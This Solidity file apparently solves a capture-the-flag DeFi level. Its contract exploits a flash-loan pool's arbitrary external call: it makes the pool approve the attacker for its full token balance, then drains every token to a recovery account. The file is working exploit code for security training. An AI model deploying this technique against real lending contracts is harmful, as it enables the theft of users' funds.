// SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;

import {IERC20} from "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
import "forge-std/console2.sol";

interface ITruster{
     function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract TrusterStealer {
    ITruster truster;
    IERC20 token;
    address recoveryAccount;
    address owner;
    uint balancePool;
    constructor(address _truster, address _token, address _recovery){
        truster = ITruster(_truster);
        token = IERC20(_token);
        owner = msg.sender;
        recoveryAccount = _recovery;
        _attack();
    }

    function _attack() internal {

        console2.log("------------Start Attack-----------");
        balancePool = token.balanceOf(address(truster));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balancePool);

        (bool success) = truster.flashLoan(0, address(this), address(token), data);
        require(success, "flashLoanFailed");
        
        console2.log("------------FlashLoan closed successfully-----------"); 
        token.transferFrom(address(truster), recoveryAccount, token.balanceOf(address(truster)));
    }

}

